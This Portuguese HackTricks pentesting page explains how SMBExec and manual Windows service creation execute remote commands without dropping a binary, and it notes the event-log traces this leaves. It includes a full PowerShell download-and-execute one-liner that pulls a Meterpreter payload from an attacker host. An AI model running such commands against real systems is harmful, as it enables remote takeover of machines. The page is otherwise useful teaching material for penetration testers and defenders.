# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Trabalha numa **empresa de cibersegurança**? Quer ver a sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Como funciona

**Smbexec funciona como Psexec.** Neste exemplo, **em vez** de apontar o "_binpath_" para um executável malicioso dentro da vítima, vamos **direcioná-lo** para **cmd.exe ou powershell.exe** e um deles irá baixar e executar o backdoor.

## **SMBExec**

Vamos ver o que acontece quando o smbexec é executado, observando do lado do atacante e do alvo:

![](../../.gitbook/assets/smbexec\_prompt.png)

Então sabemos que ele cria um serviço "BTOBTO". Mas esse serviço não está presente na máquina alvo quando fazemos um `sc query`. Os logs do sistema revelam uma pista do que aconteceu:

![](../../.gitbook/assets/smbexec\_service.png)

O Nome do Arquivo de Serviço contém uma string de comando para executar (%COMSPEC% aponta para o caminho absoluto do cmd.exe). Ele ecoa o comando a ser executado para um arquivo bat, redireciona o stdout e stderr para um arquivo Temp, executa o arquivo bat e o deleta. De volta ao Kali, o script Python então puxa o arquivo de saída via SMB e exibe o conteúdo em nosso "pseudo-shell". Para cada comando que digitamos em nosso "shell", um novo serviço é criado e o processo é repetido. É por isso que não é necessário soltar um binário, ele apenas executa cada comando desejado como um novo serviço. Definitivamente mais furtivo, mas como vimos, um log de eventos é criado para cada comando executado. Ainda assim, uma maneira muito inteligente de obter um "shell" não interativo!

## SMBExec Manual

**Ou executando comandos via serviços**

Como o smbexec demonstrou, é possível executar comandos diretamente de binPaths de serviços em vez de precisar de um binário. Isso pode ser um truque útil para ter na manga se você precisar executar apenas um comando arbitrário em uma máquina Windows alvo. Como um exemplo rápido, vamos obter um shell Meterpreter usando um serviço remoto _sem_ um binário.

Usaremos o módulo `web_delivery` do Metasploit e escolheremos um alvo PowerShell com um payload Meterpreter reverso. O listener é configurado e ele nos diz o comando a executar na máquina alvo:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
Do nosso ataque Windows, criamos um serviço remoto ("metpsh") e definimos o binPath para executar cmd.exe com nosso payload:

![](../../.gitbook/assets/sc\_psh\_create.png)

E então o iniciamos:

![](../../.gitbook/assets/sc\_psh\_start.png)

Ele apresenta erro porque nosso serviço não responde, mas se olharmos para o nosso ouvinte do Metasploit, vemos que o callback foi feito e o payload executado.

Todas as informações foram extraídas daqui: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
